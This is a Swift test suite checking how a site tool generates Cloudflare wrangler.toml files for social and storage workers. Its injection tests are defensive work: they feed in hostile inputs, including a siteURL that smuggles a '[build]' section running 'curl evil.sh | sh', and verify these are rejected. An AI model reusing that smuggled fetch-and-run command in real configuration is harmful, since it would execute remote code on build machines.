// Tests/AnglesiteCoreTests/WorkerCompositionTests.swift
import Testing
import Foundation
@testable import AnglesiteCore

private func worker(_ id: String, d1: Bool, kv: Bool, r2: Bool) -> WorkerDescriptor {
    WorkerDescriptor(
        id: id, displayName: id, description: "test fixture", group: "test",
        binding: .settingsActivated, resources: .init(needsD1: d1, needsKV: kv, needsR2: r2)
    )
}

private let genericD1KVWorker = worker("generic-d1kv-fixture", d1: true, kv: true, r2: false)
private let indieauthWorker = worker("indieauth", d1: true, kv: true, r2: false)
private let micropubWorker = worker("micropub", d1: true, kv: true, r2: true)
private let websubWorker = worker("websub", d1: true, kv: true, r2: false)
private let microsubWorker = worker(WorkerComposition.microsubWorkerID, d1: true, kv: false, r2: false)
private let v2Workers = [genericD1KVWorker, indieauthWorker]
private let v3Workers = [genericD1KVWorker, indieauthWorker, micropubWorker, websubWorker]
private let webmentionWorker = worker(WorkerComposition.webmentionWorkerID, d1: false, kv: false, r2: false)
private let solidOidcWorker = worker(WorkerComposition.solidOidcWorkerID, d1: true, kv: false, r2: false)
private let solidPodWorker = worker(WorkerComposition.solidPodWorkerID, d1: false, kv: false, r2: true)
private let webdavWorker = worker(WorkerComposition.webdavWorkerID, d1: false, kv: false, r2: true)

@Suite("WorkerComposition")
struct WorkerCompositionTests {
    @Test("generates wrangler.toml with static assets and no social features")
    func staticOnly() throws {
        let toml = try WorkerComposition.generateWranglerToml(
            siteName: "my-site",
            workers: []
        )
        #expect(toml.contains("name = \"my-site\""))
        #expect(toml.contains("[assets]"))
        #expect(toml.contains("directory = \"dist\""))
        #expect(!toml.contains("[[d1_databases]]"))
    }

    @Test("generates wrangler.toml with webmention + indieauth (D1 + KV yes, R2 no)")
    func withSocialFeatures() throws {
        let toml = try WorkerComposition.generateWranglerToml(
            siteName: "my-site",
            workers: [genericD1KVWorker, indieauthWorker]
        )
        #expect(toml.contains("name = \"my-site\""))
        #expect(toml.contains("[assets]"))
        #expect(toml.contains("[[d1_databases]]"))
        #expect(toml.contains("binding = \"DB\""))
        #expect(toml.contains("binding = \"AUTH_DB\""))
        #expect(toml.contains("migrations_dir = \"worker/migrations\""))
        #expect(toml.contains("[[kv_namespaces]]"))
        #expect(toml.contains("binding = \"SOCIAL_KV\""))
        #expect(toml.contains("binding = \"ASSETS\""))
        // No route claims → no run_worker_first at all (#746): unclaimed paths stay asset-first,
        // and the worker still receives its endpoints via Cloudflare's asset-miss fallback.
        #expect(!toml.contains("run_worker_first"))
        #expect(toml.contains("# Secrets required for IndieAuth (set with `wrangler secret put <NAME>`):"))
        #expect(toml.contains("# TOKEN_SIGNING_KEY, INDIEAUTH_OWNER_PASSWORD"))
        #expect(!toml.contains("[secrets]"))
        #expect(toml.contains("[observability]"))
        #expect(!toml.contains("[[r2_buckets]]"))
    }

    @Test("generates wrangler.toml with V-2 workers (D1 yes, R2 no — micropub is V-3)")
    func v2Features() throws {
        let toml = try WorkerComposition.generateWranglerToml(
            siteName: "my-site",
            workers: v2Workers
        )
        #expect(toml.contains("[[d1_databases]]"))
        #expect(toml.contains("[[kv_namespaces]]"))
        #expect(!toml.contains("[[r2_buckets]]"))
    }

    @Test("generates wrangler.toml with V-3 workers (D1 + R2 — micropub needs media)")
    func v3Features() throws {
        let toml = try WorkerComposition.generateWranglerToml(
            siteName: "my-site",
            workers: v3Workers
        )
        #expect(toml.contains("[[d1_databases]]"))
        #expect(toml.contains("[[kv_namespaces]]"))
        #expect(toml.contains("[[r2_buckets]]"))
        #expect(toml.contains("binding = \"MEDIA\""))
    }

    @Test("writes provisioned Cloudflare resource ids into wrangler.toml")
    func provisionedResources() throws {
        let toml = try WorkerComposition.generateWranglerToml(
            siteName: "my-site",
            workers: v3Workers,
            resources: .init(d1DatabaseID: "d1-id", kvNamespaceID: "kv-id", r2BucketName: "custom-media")
        )

        #expect(toml.contains("database_id = \"d1-id\""))
        #expect(toml.contains("id = \"kv-id\""))
        #expect(toml.contains("bucket_name = \"custom-media\""))
    }

    @Test("rejects site names containing TOML-unsafe characters")
    func rejectsInvalidSiteName() {
        #expect(throws: WorkerComposition.ConfigError.self) {
            try WorkerComposition.generateWranglerToml(
                siteName: "my\"site\ninjected",
                workers: []
            )
        }
    }

    @Test("inboxCaptureEnabled adds an INBOX_KV binding and uncomments main even with no @dwk/* workers")
    func inboxCaptureAddsKVBinding() throws {
        let toml = try WorkerComposition.generateWranglerToml(
            siteName: "my-site", workers: [], inboxCaptureEnabled: true)
        #expect(toml.contains("main = \"worker/worker.ts\""))
        #expect(toml.contains("binding = \"INBOX_KV\""))
        #expect(toml.contains("id = \"\"  # filled by provisioning"))
    }

    @Test("inboxCaptureEnabled fills the provisioned namespace id when given")
    func inboxCaptureFillsProvisionedID() throws {
        let toml = try WorkerComposition.generateWranglerToml(
            siteName: "my-site", workers: [], inboxCaptureEnabled: true, inboxKVNamespaceID: "abc123")
        #expect(toml.contains("id = \"abc123\""))
    }

    @Test("inboxCaptureEnabled false omits the INBOX_KV binding")
    func inboxCaptureDisabledOmitsBinding() throws {
        let toml = try WorkerComposition.generateWranglerToml(siteName: "my-site", workers: [])
        #expect(!toml.contains("INBOX_KV"))
        #expect(!toml.contains("main ="))
    }

    @Test("route claims emit deterministic, sorted, deduplicated run_worker_first entries")
    func selectiveRunWorkerFirst() throws {
        let claims = [
            WorkerRouteClaim(path: "/token", match: .exact, methods: ["POST"], handler: "indieauth"),
            WorkerRouteClaim(path: "/authorize", match: .exact, methods: ["GET", "POST"], handler: "indieauth"),
            WorkerRouteClaim(path: "/authorize", match: .exact, methods: ["GET", "POST"], handler: "indieauth"),
            WorkerRouteClaim(
                path: "/.well-known/acme-challenge", match: .prefix, methods: ["GET"], handler: "acme",
                specificationURL: URL(string: "https://www.rfc-editor.org/rfc/rfc8555")),
        ]
        let toml = try WorkerComposition.generateWranglerToml(
            siteName: "my-site", workers: [indieauthWorker], routeClaims: claims)
        #expect(toml.contains(
            #"run_worker_first = ["/.well-known/acme-challenge", "/.well-known/acme-challenge/*", "/authorize", "/token"]"#
        ))
        // Regeneration is byte-stable regardless of claim order.
        let regenerated = try WorkerComposition.generateWranglerToml(
            siteName: "my-site", workers: [indieauthWorker], routeClaims: claims.reversed())
        #expect(toml == regenerated)
    }

    @Test("run_worker_first is omitted entirely when there are no active dynamic routes")
    func omitsRunWorkerFirstWithoutClaims() throws {
        let toml = try WorkerComposition.generateWranglerToml(
            siteName: "my-site", workers: [genericD1KVWorker, indieauthWorker])
        #expect(!toml.contains("run_worker_first"))
        #expect(toml.contains("binding = \"ASSETS\""))
    }

    @Test("inbox capture claims /inbox as a worker-first route")
    func inboxCaptureClaimsRoute() throws {
        let toml = try WorkerComposition.generateWranglerToml(
            siteName: "my-site", workers: [], inboxCaptureEnabled: true)
        #expect(toml.contains(#"run_worker_first = ["/inbox"]"#))
    }

    @Test("static-only sites emit no run_worker_first")
    func staticOnlyOmitsRunWorkerFirst() throws {
        let toml = try WorkerComposition.generateWranglerToml(siteName: "my-site", workers: [])
        #expect(!toml.contains("run_worker_first"))
    }

    @Test("an unvalidated route claim path is refused, not interpolated into TOML")
    func rejectsInvalidRouteClaim() {
        let hostile = WorkerRouteClaim(
            path: "/a\"]\ninjected = true", match: .exact, methods: ["GET"], handler: "x")
        #expect(throws: WorkerComposition.ConfigError.self) {
            try WorkerComposition.generateWranglerToml(
                siteName: "my-site", workers: [indieauthWorker], routeClaims: [hostile])
        }
    }

    @Test("composition runs full claim validation, not just path syntax")
    func rejectsSemanticallyInvalidRouteClaim() {
        // Valid path, invalid methods (HEAD without paired GET) — only full validation catches it.
        let headOnly = WorkerRouteClaim(
            path: "/status", match: .exact, methods: ["HEAD"], handler: "x")
        #expect(throws: WorkerComposition.ConfigError.self) {
            try WorkerComposition.generateWranglerToml(
                siteName: "my-site", workers: [indieauthWorker], routeClaims: [headOnly])
        }
    }

    @Test("webmention receive adds a WEBMENTION_INBOX D1 binding on the shared database")
    func webmentionAddsInboxBinding() throws {
        let toml = try WorkerComposition.generateWranglerToml(
            siteName: "my-site",
            workers: [webmentionWorker],
            resources: .init(d1DatabaseID: "d1-id")
        )
        #expect(toml.contains("binding = \"WEBMENTION_INBOX\""))
        #expect(toml.contains("database_id = \"d1-id\""))
    }

    @Test("no webmention worker means no WEBMENTION_INBOX binding")
    func noWebmentionOmitsInboxBinding() throws {
        let toml = try WorkerComposition.generateWranglerToml(siteName: "my-site", workers: [indieauthWorker])
        #expect(!toml.contains("WEBMENTION_INBOX"))
    }

    @Test("webmention receive adds queue producer/consumer blocks")
    func webmentionAddsQueueBlocks() throws {
        let toml = try WorkerComposition.generateWranglerToml(
            siteName: "my-site",
            workers: [webmentionWorker],
            resources: .init(queueName: "my-site-webmention")
        )
        #expect(toml.contains("[[queues.producers]]"))
        #expect(toml.contains("[[queues.consumers]]"))
        #expect(toml.contains("queue = \"my-site-webmention\""))
        #expect(toml.contains("binding = \"WEBMENTION_QUEUE\""))
    }

    @Test("webmention queue name defaults to a deterministic placeholder before provisioning")
    func webmentionQueueDefaultsUnprovisioned() throws {
        let toml = try WorkerComposition.generateWranglerToml(siteName: "my-site", workers: [webmentionWorker])
        #expect(toml.contains("queue = \"my-site-webmention\""))
    }

    @Test("websub adds a WEBSUB_DB D1 binding on the shared database")
    func websubAddsStoreBinding() throws {
        let toml = try WorkerComposition.generateWranglerToml(
            siteName: "my-site",
            workers: [websubWorker],
            resources: .init(d1DatabaseID: "d1-id")
        )
        #expect(toml.contains("binding = \"WEBSUB_DB\""))
        #expect(toml.contains("database_id = \"d1-id\""))
    }

    @Test("no websub worker means no WEBSUB_DB binding or websub queue")
    func noWebsubOmitsHubBindings() throws {
        let toml = try WorkerComposition.generateWranglerToml(siteName: "my-site", workers: [webmentionWorker])
        #expect(!toml.contains("WEBSUB_DB"))
        #expect(!toml.contains("WEBSUB_QUEUE"))
        #expect(!toml.contains("my-site-websub"))
    }

    @Test("websub adds its own queue producer/consumer blocks, separate from webmention's")
    func websubAddsQueueBlocks() throws {
        let toml = try WorkerComposition.generateWranglerToml(
            siteName: "my-site",
            workers: [webmentionWorker, websubWorker],
            resources: .init(queueName: "my-site-webmention", websubQueueName: "my-site-websub")
        )
        #expect(toml.contains("binding = \"WEBMENTION_QUEUE\""))
        #expect(toml.contains("queue = \"my-site-webmention\""))
        #expect(toml.contains("binding = \"WEBSUB_QUEUE\""))
        #expect(toml.contains("queue = \"my-site-websub\""))
    }

    @Test("websub queue name defaults to a deterministic placeholder before provisioning")
    func websubQueueDefaultsUnprovisioned() throws {
        let toml = try WorkerComposition.generateWranglerToml(siteName: "my-site", workers: [websubWorker])
        #expect(toml.contains("queue = \"my-site-websub\""))
    }

    @Test("websub alone (no webmention) with a known site URL emits a SITE_URL var")
    func websubEmitsSiteURL() throws {
        let toml = try WorkerComposition.generateWranglerToml(
            siteName: "my-site", workers: [websubWorker], siteURL: "https://my-site.example")
        #expect(toml.contains("[vars]"))
        #expect(toml.contains("SITE_URL = \"https://my-site.example\""))
    }

    @Test("webmention receive with a known site URL emits a SITE_URL var")
    func webmentionEmitsSiteURL() throws {
        let toml = try WorkerComposition.generateWranglerToml(
            siteName: "my-site", workers: [webmentionWorker], siteURL: "https://my-site.example")
        #expect(toml.contains("[vars]"))
        #expect(toml.contains("SITE_URL = \"https://my-site.example\""))
    }

    @Test("webmention receive with no known site URL omits the vars block")
    func webmentionOmitsSiteURLWhenUnknown() throws {
        let toml = try WorkerComposition.generateWranglerToml(siteName: "my-site", workers: [webmentionWorker])
        #expect(!toml.contains("[vars]"))
        #expect(!toml.contains("SITE_URL"))
    }

    // MARK: - Microsub reader (V-4.3, #365)

    @Test("microsub adds a MICROSUB_DB D1 binding on the shared database")
    func microsubAddsStoreBinding() throws {
        let toml = try WorkerComposition.generateWranglerToml(
            siteName: "my-site",
            workers: [microsubWorker],
            resources: .init(d1DatabaseID: "d1-id")
        )
        #expect(toml.contains("binding = \"MICROSUB_DB\""))
        #expect(toml.contains("database_id = \"d1-id\""))
    }

    @Test("no microsub worker means no MICROSUB_DB binding or microsub queue")
    func noMicrosubOmitsReaderBindings() throws {
        let toml = try WorkerComposition.generateWranglerToml(siteName: "my-site", workers: [webmentionWorker])
        #expect(!toml.contains("MICROSUB_DB"))
        #expect(!toml.contains("MICROSUB_QUEUE"))
        #expect(!toml.contains("my-site-microsub"))
    }

    @Test("microsub adds its own queue producer/consumer blocks, separate from webmention's/websub's")
    func microsubAddsQueueBlocks() throws {
        let toml = try WorkerComposition.generateWranglerToml(
            siteName: "my-site",
            workers: [webmentionWorker, websubWorker, microsubWorker],
            resources: .init(
                queueName: "my-site-webmention", websubQueueName: "my-site-websub",
                microsubQueueName: "my-site-microsub"
            )
        )
        #expect(toml.contains("binding = \"WEBMENTION_QUEUE\""))
        #expect(toml.contains("binding = \"WEBSUB_QUEUE\""))
        #expect(toml.contains("binding = \"MICROSUB_QUEUE\""))
        #expect(toml.contains("queue = \"my-site-microsub\""))
    }

    @Test("microsub queue name defaults to a deterministic placeholder before provisioning")
    func microsubQueueDefaultsUnprovisioned() throws {
        let toml = try WorkerComposition.generateWranglerToml(siteName: "my-site", workers: [microsubWorker])
        #expect(toml.contains("queue = \"my-site-microsub\""))
    }

    @Test("microsub adds a Cron Trigger for the feed poller")
    func microsubAddsCronTrigger() throws {
        let toml = try WorkerComposition.generateWranglerToml(siteName: "my-site", workers: [microsubWorker])
        #expect(toml.contains("[triggers]"))
        #expect(toml.contains("crons = [\"*/15 * * * *\"]"))
    }

    @Test("no microsub worker means no Cron Trigger")
    func noMicrosubMeansNoCronTrigger() throws {
        let toml = try WorkerComposition.generateWranglerToml(siteName: "my-site", workers: [webmentionWorker])
        #expect(!toml.contains("[triggers]"))
    }

    @Test("microsub alone (no webmention/websub) with a known site URL emits a SITE_URL var")
    func microsubEmitsSiteURL() throws {
        let toml = try WorkerComposition.generateWranglerToml(
            siteName: "my-site", workers: [microsubWorker], siteURL: "https://my-site.example")
        #expect(toml.contains("[vars]"))
        #expect(toml.contains("SITE_URL = \"https://my-site.example\""))
    }

    @Test("micropub adds a MICROPUB_DB D1 binding on the shared database")
    func micropubAddsDatabaseBinding() throws {
        let micropub = worker(WorkerComposition.micropubWorkerID, d1: true, kv: false, r2: true)
        let toml = try WorkerComposition.generateWranglerToml(
            siteName: "my-site", workers: [micropub])
        #expect(toml.contains("binding = \"MICROPUB_DB\""))
        #expect(toml.contains("database_name = \"my-site-social\""))
    }

    @Test("no micropub worker means no MICROPUB_DB binding")
    func noMicropubMeansNoDatabaseBinding() throws {
        let toml = try WorkerComposition.generateWranglerToml(siteName: "my-site", workers: [])
        #expect(!toml.contains("MICROPUB_DB"))
    }

    @Test("micropub's MICROPUB_DB binding uses the provisioned database id when known")
    func micropubUsesProvisionedDatabaseID() throws {
        let micropub = worker(WorkerComposition.micropubWorkerID, d1: true, kv: false, r2: true)
        let toml = try WorkerComposition.generateWranglerToml(
            siteName: "my-site", workers: [micropub],
            resources: .init(d1DatabaseID: "d1-existing"))
        // Find the MICROPUB_DB block specifically, not just any database_id in the file (the
        // generic DB block from needsD1 also emits one).
        let micropubBlock = try #require(toml.range(of: "binding = \"MICROPUB_DB\""))
        let tail = toml[micropubBlock.upperBound...]
        #expect(tail.contains("database_id = \"d1-existing\""))
    }

    @Test("activitypub adds a durable_objects.bindings block and a migrations block")
    func activitypubAddsDurableObjectBinding() throws {
        let activitypub = worker(WorkerComposition.activitypubWorkerID, d1: false, kv: false, r2: false)
        let toml = try WorkerComposition.generateWranglerToml(siteName: "my-site", workers: [activitypub])
        #expect(toml.contains("[[durable_objects.bindings]]"))
        #expect(toml.contains("name = \"ACTOR\""))
        #expect(toml.contains("class_name = \"ActivityPubObject\""))
        #expect(toml.contains("[[migrations]]"))
        #expect(toml.contains("tag = \"v1\""))
        #expect(toml.contains("new_sqlite_classes = [\"ActivityPubObject\"]"))
    }

    @Test("no activitypub worker means no durable_objects or migrations block")
    func noActivitypubMeansNoDurableObjectBinding() throws {
        let toml = try WorkerComposition.generateWranglerToml(siteName: "my-site", workers: [])
        #expect(!toml.contains("durable_objects"))
        #expect(!toml.contains("[[migrations]]"))
    }

    @Test("activitypub with a known display name emits an AP_DISPLAY_NAME var")
    func activitypubWithDisplayNameEmitsVar() throws {
        let activitypub = worker(WorkerComposition.activitypubWorkerID, d1: false, kv: false, r2: false)
        let toml = try WorkerComposition.generateWranglerToml(
            siteName: "my-site", workers: [activitypub], displayName: "Alice's Blog"
        )
        #expect(toml.contains("[vars]"))
        #expect(toml.contains("AP_DISPLAY_NAME = \"Alice's Blog\""))
    }

    @Test("activitypub with no known display name omits AP_DISPLAY_NAME but not other vars")
    func activitypubWithoutDisplayNameOmitsVar() throws {
        let activitypub = worker(WorkerComposition.activitypubWorkerID, d1: false, kv: false, r2: false)
        let toml = try WorkerComposition.generateWranglerToml(siteName: "my-site", workers: [activitypub])
        #expect(!toml.contains("AP_DISPLAY_NAME"))
    }

    @Test("displayName and siteURL vars coexist in one [vars] block when both are known")
    func displayNameAndSiteURLCoexist() throws {
        let activitypub = worker(WorkerComposition.activitypubWorkerID, d1: false, kv: false, r2: false)
        let webmention = worker(WorkerComposition.webmentionWorkerID, d1: false, kv: false, r2: false)
        let toml = try WorkerComposition.generateWranglerToml(
            siteName: "my-site", workers: [activitypub, webmention],
            siteURL: "https://example.com", displayName: "Alice's Blog"
        )
        let varsRange = try #require(toml.range(of: "[vars]"))
        let afterVars = toml[varsRange.upperBound...]
        #expect(afterVars.contains("SITE_URL = \"https://example.com\""))
        #expect(afterVars.contains("AP_DISPLAY_NAME = \"Alice's Blog\""))
    }

    @Test("a displayName containing a double quote is rejected, not interpolated raw into TOML")
    func displayNameWithDoubleQuoteIsRejected() throws {
        let activitypub = worker(WorkerComposition.activitypubWorkerID, d1: false, kv: false, r2: false)
        let toml = try WorkerComposition.generateWranglerToml(
            siteName: "my-site", workers: [activitypub], displayName: "Alice\" INJECTED"
        )
        #expect(!toml.contains("AP_DISPLAY_NAME"))
    }

    @Test("activitypub with a known handle override emits an AP_USERNAME var")
    func activitypubWithUsernameEmitsVar() throws {
        let activitypub = worker(WorkerComposition.activitypubWorkerID, d1: false, kv: false, r2: false)
        let toml = try WorkerComposition.generateWranglerToml(
            siteName: "my-site", workers: [activitypub], apUsername: "alice"
        )
        #expect(toml.contains("[vars]"))
        #expect(toml.contains("AP_USERNAME = \"alice\""))
    }

    @Test("activitypub with no handle override omits AP_USERNAME but not other vars")
    func activitypubWithoutUsernameOmitsVar() throws {
        let activitypub = worker(WorkerComposition.activitypubWorkerID, d1: false, kv: false, r2: false)
        let toml = try WorkerComposition.generateWranglerToml(siteName: "my-site", workers: [activitypub])
        #expect(!toml.contains("AP_USERNAME"))
    }

    @Test("apUsername and displayName vars coexist in one [vars] block when both are known")
    func apUsernameAndDisplayNameCoexist() throws {
        let activitypub = worker(WorkerComposition.activitypubWorkerID, d1: false, kv: false, r2: false)
        let toml = try WorkerComposition.generateWranglerToml(
            siteName: "my-site", workers: [activitypub],
            displayName: "Alice's Blog", apUsername: "alice"
        )
        let varsRange = try #require(toml.range(of: "[vars]"))
        let afterVars = toml[varsRange.upperBound...]
        #expect(afterVars.contains("AP_DISPLAY_NAME = \"Alice's Blog\""))
        #expect(afterVars.contains("AP_USERNAME = \"alice\""))
    }

    @Test("an apUsername containing a double quote is rejected, not interpolated raw into TOML")
    func apUsernameWithDoubleQuoteIsRejected() throws {
        let activitypub = worker(WorkerComposition.activitypubWorkerID, d1: false, kv: false, r2: false)
        let toml = try WorkerComposition.generateWranglerToml(
            siteName: "my-site", workers: [activitypub], apUsername: "alice\" INJECTED"
        )
        #expect(!toml.contains("AP_USERNAME"))
    }

    @Test("siteURL is ignored when webmention receive isn't active")
    func siteURLIgnoredWithoutWebmention() throws {
        let toml = try WorkerComposition.generateWranglerToml(
            siteName: "my-site", workers: [indieauthWorker], siteURL: "https://my-site.example")
        #expect(!toml.contains("SITE_URL"))
    }

    @Test("activitypub with actorType Group emits AP_ACTOR_TYPE")
    func activitypubGroupEmitsActorTypeVar() throws {
        let activitypub = worker(WorkerComposition.activitypubWorkerID, d1: false, kv: false, r2: false)
        let toml = try WorkerComposition.generateWranglerToml(
            siteName: "my-site", workers: [activitypub], activityPubActorType: "Group"
        )
        #expect(toml.contains("AP_ACTOR_TYPE = \"Group\""))
    }

    @Test("activitypub with no actorType (or a non-Group value) omits AP_ACTOR_TYPE")
    func activitypubWithoutGroupOmitsActorTypeVar() throws {
        let activitypub = worker(WorkerComposition.activitypubWorkerID, d1: false, kv: false, r2: false)
        let toml = try WorkerComposition.generateWranglerToml(siteName: "my-site", workers: [activitypub])
        #expect(!toml.contains("AP_ACTOR_TYPE"))
        let tomlPerson = try WorkerComposition.generateWranglerToml(
            siteName: "my-site", workers: [activitypub], activityPubActorType: "Person")
        #expect(!tomlPerson.contains("AP_ACTOR_TYPE"))
    }

    @Test("Group actor with moderators emits a comma-joined AP_MODERATORS var")
    func groupActorEmitsModeratorsVar() throws {
        let activitypub = worker(WorkerComposition.activitypubWorkerID, d1: false, kv: false, r2: false)
        let toml = try WorkerComposition.generateWranglerToml(
            siteName: "my-site", workers: [activitypub], activityPubActorType: "Group",
            moderators: ["https://mod1.example/actor", "https://mod2.example/actor"]
        )
        #expect(toml.contains("AP_MODERATORS = \"https://mod1.example/actor,https://mod2.example/actor\""))
    }

    @Test("moderators are ignored when actorType isn't Group")
    func moderatorsIgnoredWithoutGroupActorType() throws {
        let activitypub = worker(WorkerComposition.activitypubWorkerID, d1: false, kv: false, r2: false)
        let toml = try WorkerComposition.generateWranglerToml(
            siteName: "my-site", workers: [activitypub], moderators: ["https://mod1.example/actor"]
        )
        #expect(!toml.contains("AP_MODERATORS"))
        #expect(!toml.contains("AP_ACTOR_TYPE"))
    }

    @Test("empty or unsafe moderator IRIs are filtered out, leaving AP_ACTOR_TYPE alone")
    func unsafeModeratorIRIsAreFiltered() throws {
        let activitypub = worker(WorkerComposition.activitypubWorkerID, d1: false, kv: false, r2: false)
        let toml = try WorkerComposition.generateWranglerToml(
            siteName: "my-site", workers: [activitypub], activityPubActorType: "Group",
            moderators: ["", "https://evil.example/\"injected"]
        )
        #expect(toml.contains("AP_ACTOR_TYPE = \"Group\""))
        #expect(!toml.contains("AP_MODERATORS"))
    }

    @Test("a moderator IRI containing a comma is excluded, not joined into a corrupted list")
    func moderatorIRIWithCommaIsExcluded() throws {
        let activitypub = worker(WorkerComposition.activitypubWorkerID, d1: false, kv: false, r2: false)
        let toml = try WorkerComposition.generateWranglerToml(
            siteName: "my-site", workers: [activitypub], activityPubActorType: "Group",
            moderators: ["https://mod1.example/actor", "https://evil.example/actor?a=1,b=2"]
        )
        // The comma-bearing IRI is dropped entirely rather than corrupting the comma-joined list
        // — mod1 alone still emits a valid, unambiguous AP_MODERATORS value.
        #expect(toml.contains("AP_MODERATORS = \"https://mod1.example/actor\""))
        #expect(!toml.contains("evil.example"))
    }

    @Test("every moderator IRI containing a comma leaves AP_MODERATORS omitted entirely")
    func allCommaModeratorsOmitsVar() throws {
        let activitypub = worker(WorkerComposition.activitypubWorkerID, d1: false, kv: false, r2: false)
        let toml = try WorkerComposition.generateWranglerToml(
            siteName: "my-site", workers: [activitypub], activityPubActorType: "Group",
            moderators: ["https://evil.example/actor?a=1,b=2"]
        )
        #expect(toml.contains("AP_ACTOR_TYPE = \"Group\""))
        #expect(!toml.contains("AP_MODERATORS"))
    }

    @Test("a siteURL containing a double quote is rejected, not interpolated raw into TOML")
    func rejectsSiteURLWithEmbeddedQuote() throws {
        let malicious = "https://example.com\"\n[build]\ncommand = \"curl evil.sh | sh"
        let toml = try WorkerComposition.generateWranglerToml(
            siteName: "my-site", workers: [webmentionWorker], siteURL: malicious)
        #expect(!toml.contains("SITE_URL"))
        #expect(!toml.contains("[build]"))
        #expect(!toml.contains("curl evil.sh"))
    }

    @Test("a siteURL containing a backslash is rejected")
    func rejectsSiteURLWithBackslash() throws {
        let toml = try WorkerComposition.generateWranglerToml(
            siteName: "my-site", workers: [webmentionWorker], siteURL: #"https://example.com\injected"#)
        #expect(!toml.contains("SITE_URL"))
    }

    @Test("a siteURL containing a control character (newline) is rejected")
    func rejectsSiteURLWithControlCharacter() throws {
        let toml = try WorkerComposition.generateWranglerToml(
            siteName: "my-site", workers: [webmentionWorker], siteURL: "https://example.com\nEVIL = true")
        #expect(!toml.contains("SITE_URL"))
        #expect(!toml.contains("EVIL"))
    }

    @Test("ProvisionedResources.queueName round-trips through JSONEncoder/JSONDecoder")
    func provisionedResourcesQueueNameCodable() throws {
        let resources = WorkerComposition.ProvisionedResources(queueName: "my-site-webmention")
        let data = try JSONEncoder().encode(resources)
        let decoded = try JSONDecoder().decode(WorkerComposition.ProvisionedResources.self, from: data)
        #expect(decoded == resources)
    }

    @Test("ProvisionedResources round-trips through JSONEncoder/JSONDecoder")
    func provisionedResourcesCodable() throws {
        let resources = WorkerComposition.ProvisionedResources(
            d1DatabaseID: "d1-id", kvNamespaceID: "kv-id", r2BucketName: "media-bucket"
        )
        let data = try JSONEncoder().encode(resources)
        let decoded = try JSONDecoder().decode(WorkerComposition.ProvisionedResources.self, from: data)
        #expect(decoded == resources)
    }

    // MARK: - Solid-OIDC / Solid Pod / WebDAV (#1055 slice)

    @Test("solid-oidc emits its OIDC_SIGNING_KEY secret comment, reusing indieauth's AUTH_DB")
    func solidOidcBindings() throws {
        let toml = try WorkerComposition.generateWranglerToml(
            siteName: "my-site", workers: [indieauthWorker, solidOidcWorker]
        )
        #expect(toml.contains("binding = \"AUTH_DB\""))
        #expect(toml.contains("OIDC_SIGNING_KEY"))
        // Only one AUTH_DB block — solid-oidc must not emit a second, differently-keyed one.
        #expect(toml.components(separatedBy: "binding = \"AUTH_DB\"").count == 2)
    }

    @Test("solid-pod emits its own Durable Object, R2 bucket, and GC cron trigger")
    func solidPodBindings() throws {
        let toml = try WorkerComposition.generateWranglerToml(
            siteName: "my-site", workers: [solidPodWorker]
        )
        #expect(toml.contains("name = \"POD\""))
        #expect(toml.contains("class_name = \"SolidPodObject\""))
        #expect(toml.contains("new_sqlite_classes = [\"SolidPodObject\"]"))
        #expect(toml.contains("binding = \"BLOBS\""))
        #expect(toml.contains("bucket_name = \"my-site-pod-blobs\""))
        #expect(toml.contains("crons = [\"*/5 * * * *\"]"))
        // Solid Pod's own R2 bucket must never be confused with Micropub's MEDIA bucket.
        #expect(!toml.contains("binding = \"MEDIA\""))
    }

    @Test("solid-pod's R2 bucket coexists with micropub's MEDIA bucket, distinctly named")
    func solidPodAndMicropubR2DontCollide() throws {
        let micropub = worker(WorkerComposition.micropubWorkerID, d1: true, kv: false, r2: true)
        let toml = try WorkerComposition.generateWranglerToml(
            siteName: "my-site", workers: [solidPodWorker, micropub]
        )
        #expect(toml.contains("binding = \"BLOBS\""))
        #expect(toml.contains("bucket_name = \"my-site-pod-blobs\""))
        #expect(toml.contains("binding = \"MEDIA\""))
        #expect(toml.contains("bucket_name = \"my-site-media\""))
    }

    @Test("webdav emits its WEBDAV_PEPPER secret comment and reuses solid-pod's DO/R2, no duplicates")
    func webdavBindings() throws {
        let toml = try WorkerComposition.generateWranglerToml(
            siteName: "my-site", workers: [solidPodWorker, webdavWorker]
        )
        #expect(toml.contains("WEBDAV_PEPPER"))
        #expect(toml.components(separatedBy: "name = \"POD\"").count == 2)
        #expect(toml.components(separatedBy: "binding = \"BLOBS\"").count == 2)
    }

    @Test("solid-pod and activitypub Durable Objects each get their own migration tag")
    func solidPodAndActivityPubMigrationTagsDontCollide() throws {
        let activitypub = worker(WorkerComposition.activitypubWorkerID, d1: false, kv: false, r2: false)
        let toml = try WorkerComposition.generateWranglerToml(
            siteName: "my-site", workers: [activitypub, solidPodWorker]
        )
        #expect(toml.contains("tag = \"v1\""))
        #expect(toml.contains("new_sqlite_classes = [\"ActivityPubObject\"]"))
        #expect(toml.contains("tag = \"v2\""))
        #expect(toml.contains("new_sqlite_classes = [\"SolidPodObject\"]"))
    }

    @Test("no solid-pod worker means no POD/BLOBS bindings or GC cron")
    func noSolidPodMeansNoBindings() throws {
        let toml = try WorkerComposition.generateWranglerToml(siteName: "my-site", workers: [indieauthWorker])
        #expect(!toml.contains("SolidPodObject"))
        #expect(!toml.contains("BLOBS"))
        #expect(!toml.contains("*/5 * * * *"))
    }

    @Test("ProvisionedResources' inbox fields round-trip through Codable")
    func provisionedResourcesInboxFieldsCodable() throws {
        let resources = WorkerComposition.ProvisionedResources(inboxKVNamespaceID: "ns-1", inboxAccountID: "acct-1")
        let data = try PropertyListEncoder().encode(resources)
        let decoded = try PropertyListDecoder().decode(WorkerComposition.ProvisionedResources.self, from: data)
        #expect(decoded == resources)
    }
}
